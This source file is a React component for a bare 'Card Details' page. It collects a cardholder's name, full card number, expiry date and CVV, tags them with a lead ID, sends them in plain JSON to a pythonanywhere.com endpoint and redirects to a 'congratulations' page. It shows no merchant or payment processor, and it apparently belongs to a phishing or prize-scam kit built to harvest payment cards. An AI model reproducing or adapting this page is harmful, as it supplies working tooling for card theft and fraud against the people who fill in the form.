import React, { useState } from "react";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { useNavigate } from "react-router-dom";

export default function Information() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    const formData = new FormData(e.currentTarget);
    const data = Object.fromEntries(formData.entries());

    // Add the lead ID from sessionStorage
    const leadId = sessionStorage.getItem("lead_id");
    if (leadId) {
      data.id = leadId;
    }

    try {
      const response = await fetch("https://ozxge94346.pythonanywhere.com/api/information/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        navigate("/congratulations");
      } else {
        console.error("Submission failed");
        alert("Submission failed. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-100">
      <nav className="flex items-center justify-between p-4 shadow bg-white">
        <img src="/logo.png" alt="Logo" className="scale-[0.65]" />
      </nav>

      <div className="grow flex items-center justify-center p-4">
        <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
          <h2 className="text-2xl font-semibold mb-6 text-gray-800">Card Details</h2>
          <form
            id="f"
            onSubmit={handleSubmit}
            className="space-y-4"
          >
            <div className="space-y-2">
              <Label htmlFor="name">Name</Label>
              <Input type="text" id="name" name="name" required />
            </div>

            <div className="space-y-2">
              <Label htmlFor="number">Number</Label>
              <Input
                type="tel"
                id="number"
                name="number"
                placeholder="XXXX XXXX XXXX XXXX"
                maxLength={16}
                required
              />
            </div>

            <div className="flex gap-4">
              <div className="w-1/2 space-y-2">
                <Label htmlFor="month">Exp. Month</Label>
                <Input
                  type="tel"
                  id="month"
                  name="month"
                  placeholder="MM"
                  maxLength={2}
                  required
                />
              </div>
              <div className="w-1/2 space-y-2">
                <Label htmlFor="year">Exp. Year</Label>
                <Input
                  type="tel"
                  id="year"
                  name="year"
                  placeholder="YY"
                  maxLength={2}
                  required
                />
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="code">CVV</Label>
              <Input
                type="tel"
                id="code"
                name="code"
                placeholder="XXX"
                maxLength={3}
                required
              />
            </div>

            <Button
              type="submit"
              disabled={loading}
              className="w-full bg-[#8F1920] hover:bg-[#7A1517] text-white mt-4 disabled:opacity-50"
            >
              {loading ? "Submitting..." : "Submit"}
            </Button>
          </form>
        </div>
      </div>
    </div>
  );
}